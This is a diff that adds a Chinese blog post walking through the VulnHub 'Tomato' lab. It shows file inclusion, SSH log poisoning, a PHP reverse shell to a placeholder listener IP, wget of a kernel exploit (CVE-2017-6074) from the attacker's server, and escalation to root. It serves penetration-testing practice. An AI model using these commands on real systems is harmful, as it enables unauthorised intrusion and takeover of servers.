@@ -1,0 +1,385 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>vulnhub-tomato文件包含getshell - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+
+  
+  
+  <meta name="description" content="vulnhub-tomato文件包含漏洞利用：靶机镜像..."> 
+  
+  <meta name="author" content="John Doe"> 
+
+  
+    <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  
+  
+    <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  
+  
+    <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  
+  
+    <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_h1619vhl1nr.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css">
+
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        loadingImage: '',
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      motto: {
+        api: '',
+        default: '斑驳夜，清风抚，竹影婆娑，喃喃思语望'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        alwaysShow: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      }
+    }
+  </script>
+
+  
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+<nav class="navbar">
+  <div class="left"></div>
+  <div class="center">vulnhub-tomato文件包含getshell</div>
+  <div class="right">
+    <i class="iconfont iconmenu j-navbar-menu"></i>
+  </div>
+</nav>
+
+  <nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content">
+      
+      
+      
+      
+      <li class="menu-item"><a href="/ " class="underline"> 首页</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/galleries " class="underline"> 摄影</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/archives " class="underline"> 归档</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/tags " class="underline"> 标签</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/categories " class="underline"> 分类</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/about " class="underline"> 关于</a></li>
+      
+    </ul>
+    <div class="menu-copyright"><p>Copyright© 2019 - 2020 | actor.AllRightsReserved</p></div>
+  </div>
+</nav>
+  <main id="main">
+  <div class="container" id="container">
+    <article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/theme/zhaoo/wenzhang/tomato2.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">vulnhub-tomato文件包含getshell</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 04, 2020</span
+        class="post-info-item">
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1537</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="vulnhub-tomato文件包含漏洞利用："><a href="#vulnhub-tomato文件包含漏洞利用：" class="headerlink" title="vulnhub-tomato文件包含漏洞利用："></a>vulnhub-tomato文件包含漏洞利用：</h1><p><strong>靶机镜像下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/tomato-1,557/">https://www.vulnhub.com/entry/tomato-1,557/</a></strong></p>
+<p><strong>下载之后是ova文件，导入到vm虚拟机桥接就可以开始了：</strong></p>
+<h1 id="一、信息收集："><a href="#一、信息收集：" class="headerlink" title="一、信息收集："></a><strong>一、信息收集：</strong></h1><h4 id="1-1-端口服务探测："><a href="#1-1-端口服务探测：" class="headerlink" title="1.1 端口服务探测："></a><strong>1.1 端口服务探测：</strong></h4><p><strong>首先使用nmap看一下开启了哪些服务端口</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">nmap -T4 -sV <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span> -P <span class="hljs-number">1</span><span class="hljs-number">-65535</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/01.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>访问看一下，大番茄标志</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/02.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>尝试访问8888端口有401认证，采用的是 用户名：密码 进行base64加密的方式：</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/03.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/04.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>弱口令爆破之，没爆出来</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/05.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<h4 id="1-2-敏感目录信息探测："><a href="#1-2-敏感目录信息探测：" class="headerlink" title="1.2  敏感目录信息探测："></a><strong>1.2  敏感目录信息探测：</strong></h4><p><strong>扫描一下看有没有敏感目录:</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/06.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>在使用dirb扫描时，发现了一个antibot_image目录，其他工具未发现，所以多试试字典总有惊喜。进行访问发现是目录遍历。看看有什么有价值的东西</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/07.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>看到有info.php，我们由此得到了绝对路径等信息</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/08.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>仔细观察源码发现可以包含文件，参数为image：</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/09.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>试一下包含个/etc/passwd文件试试看，成功显示存在包含漏洞：</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/10.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<h1 id="二、漏洞利用："><a href="#二、漏洞利用：" class="headerlink" title="二、漏洞利用："></a>二、漏洞利用：</h1><h4 id="2-1-利用文件包含漏洞getshell"><a href="#2-1-利用文件包含漏洞getshell" class="headerlink" title="2.1 利用文件包含漏洞getshell"></a>2.1 利用文件包含漏洞getshell</h4><p><strong>接下来思路就是上传我们的shell文件，然后包含进去。但是没找到可用上传点。看了解题过程，发现是将一句话作为ssh用户名进行连接，会被写进ssh日志，包含ssh日志成功拿到shell。ssh日志默认路径 /var/log/auth.log下，默认用户是有读取权限。好思路，说干就干：</strong></p>
+<p><strong>保险起见，先随便输个用户名test进行连接，看能否写进日志里：</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>成功写入，那就直接上命令执行吧:</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<h4 id="2-2-反弹shell"><a href="#2-2-反弹shell" class="headerlink" title="2.2 反弹shell"></a><strong>2.2 反弹shell</strong></h4><p><strong>可以看到权限比较小，操作也不太方便，利用php函数反弹个shell回来，我们利用nc去接收：</strong></p>
+<p><strong>开启nc:</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">nc -lvvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>php反弹shell代码入下：</strong></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;监听ip&quot;</span>,<span class="hljs-number">6666</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><strong>防止出错，需要进行url编码，执行：</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">http://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>/antibot_image/antibots/info.php?image=/var/log/auth.log&amp;cmd=php<span class="hljs-symbol">%20</span>-r<span class="hljs-symbol">%20</span>&#x27;<span class="hljs-symbol">%24</span>sock<span class="hljs-symbol">%3</span>Dfsockopen(<span class="hljs-symbol">%22</span>监听ip<span class="hljs-symbol">%22</span><span class="hljs-symbol">%2</span>C<span class="hljs-number">6666</span>)<span class="hljs-symbol">%3</span>Bexec(<span class="hljs-symbol">%22</span><span class="hljs-symbol">%2</span>Fbin<span class="hljs-symbol">%2</span>Fsh<span class="hljs-symbol">%20</span>-i<span class="hljs-symbol">%20</span><span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%263</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%263</span><span class="hljs-symbol">%202</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%263</span><span class="hljs-symbol">%22</span>)<span class="hljs-symbol">%3</span>B&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><strong>略等片刻，成功收到shell:</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/15.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>为了执行起来方便，使用python执行交互式shell:</strong></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/16.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<h1 id="三、获取root权限"><a href="#三、获取root权限" class="headerlink" title="三、获取root权限"></a>三、获取root权限</h1><p><strong>我们的目的是获取root权限，看下内核版本是4.4.0，直接搜索提权脚本，进行提权：</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/17.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>首先需要把脚本传到目标机器，但是没有安装rz等工具，这里利用python3本地快速搭建服务器，然后目标服务器下载到本地，进行后续执行。</strong></p>
+<p><strong>开启服务器正常访问：</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">python3 -m http.server <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/18.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>首先将脚本gcc编译好，接下来在交互shell中，下载执行：</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">wget http://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">8888</span>/CVE<span class="hljs-number">-2017</span><span class="hljs-number">-6074</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/19.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+<p><strong>可以看到没有执行权限，chmod 777 CVE-2017-6074 之后，直接执行。成功获取到了root权限，拿下服务器。</strong></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/actorich007/pic@main/img/vulnhub/tomato/20.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20201017204942389"></p>
+
+      </section>
+      <section class="extra">
+        
+        <ul class="copyright">
+  
+  <li><strong>本文作者：</strong>actorich</li>
+  <li><strong>本文链接：</strong><a href="http://www.actor360.xyz/2020/12/04/vulnhub-tomato%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/index.html">http://www.actor360.xyz/2020/12/04/vulnhub-tomato%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/index.html</a></li>
+  <li><strong>版权声明：</strong>本博客所有文章均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"
+      rel="external nofollow" target="_blank"> BY-NC-SA </a>许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+        
+<nav class="nav">
+  
+  
+    <a href="/2020/11/16/vulstack(%E4%BA%8C)%E4%B8%8B/">vulnstack红日靶场（二）下<i class="iconfont iconright"></i></a>
+  
+</nav>
+
+      </section>
+      
+      <section class="comments">
+  
+  <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article>
+  </div>
+</main>
+  <footer class="footer">
+  <div class="footer-social">
+    
+	<!--页面点击小红心-->
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/actorich007/pic@main/js/love.js"></script>
+	<!--背景点线粒子-->
+	<script type="text/javascript" color="105,105,105" opacity='0.7' zIndex="-2" count="30" src="https://cdn.jsdelivr.net/gh/actorich007/pic@main/js/canvas-nest.min.js"></script>
+  </div>
+  <div class="footer-copyright"><p>Copyright© 2019 - 2020 | actor.AllRightsReserved</p></div>
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  <div class="fab fab-daovoice">
+    <i class="iconfont iconcomment"></i>
+  </div>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"react":{"opacityDefault":0.2,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/modules.js"></script>
+<script src="/js/zui.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
+    "//widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "abcdefg"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+<script>
+  (function () {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function () {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?4c204d8bc027a0455b5fc642ac334ca8";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+</html>
